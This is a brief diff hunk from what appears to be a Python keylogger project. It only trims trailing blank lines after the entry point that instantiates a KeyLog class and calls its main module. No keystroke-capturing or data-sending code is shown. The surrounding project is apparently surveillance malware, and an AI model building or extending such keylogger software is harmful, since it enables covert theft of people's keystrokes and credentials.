@@ -313,7 +313,4 @@ class KeyLog():
 if __name__ == '__main__':
   multiprocessing.freeze_support() # For pyinstaller (Not related to keylogger)
   keylogClass = KeyLog()
-  keylogClass.mainModule()
-
-
-  
+  keylogClass.mainModule()  
